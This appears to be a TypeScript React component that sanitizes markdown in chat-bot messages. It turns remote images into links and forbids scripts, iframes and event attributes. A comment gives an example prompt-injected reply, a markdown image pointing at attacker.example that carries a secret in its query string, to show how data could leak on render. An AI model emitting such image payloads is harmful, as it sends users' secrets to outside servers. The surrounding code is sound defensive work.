import DOMPurify from "dompurify";
import { marked } from "marked";

marked.setOptions({ breaks: true, gfm: true });

function pointsOutsideApp(href: string): boolean {
  try {
    return new URL(href, window.location.href).origin !== window.location.origin;
  } catch {
    return false;
  }
}

function loadsFromElsewhere(src: string): boolean {
  try {
    const url = new URL(src, window.location.href);
    return url.protocol !== "data:" && url.protocol !== "blob:" && url.origin !== window.location.origin;
  } catch {
    return true;
  }
}

function openInNewTab(link: Element) {
  link.setAttribute("target", "_blank");
  link.setAttribute("rel", "noopener noreferrer");
}

// A link in a message that points outside the app opens in a new tab rather than navigating the
// thread away. The desktop app routes new-tab requests to the system browser (electron/main.cjs).
// The hook runs after sanitizing, so DOMPurify has already dropped unsafe hrefs such as javascript:.
//
// A remote image would load as soon as the message renders, so a prompt-injected reply such as
// ![](https://attacker.example/?d=<secret>) could hand data to any server without anyone clicking.
// It becomes a link instead; following it is the reader's decision. The backend's CSP
// (img-src 'self' data: blob:) blocks anything that gets past this.
DOMPurify.addHook("afterSanitizeAttributes", (node) => {
  if (node.tagName === "IMG") {
    node.removeAttribute("srcset");
    const src = node.getAttribute("src");
    if (src && loadsFromElsewhere(src)) {
      const link = node.ownerDocument.createElement("a");
      link.setAttribute("href", src);
      openInNewTab(link);
      let host = src;
      try { host = new URL(src, window.location.href).host; } catch { /* keep the raw text */ }
      link.textContent = `[image: ${node.getAttribute("alt") || host}]`;
      node.replaceWith(link);
    }
    return;
  }
  const href = node.tagName === "A" ? node.getAttribute("href") : null;
  if (href && pointsOutsideApp(href)) openInNewTab(node);
});

export default function MarkdownContent({ content }: { content: string }) {
  const html = DOMPurify.sanitize(marked.parse(content) as string, {
    USE_PROFILES: { html: true },
    // Media tags load their sources on render, like remote images; bot messages have no use for them.
    FORBID_TAGS: ["style", "script", "iframe", "object", "embed", "form", "audio", "video", "source", "picture", "track"],
    FORBID_ATTR: ["style", "onerror", "onclick", "onload"],
  });
  return <div className="markdown-content text-sm" dangerouslySetInnerHTML={{ __html: html }} />;
}
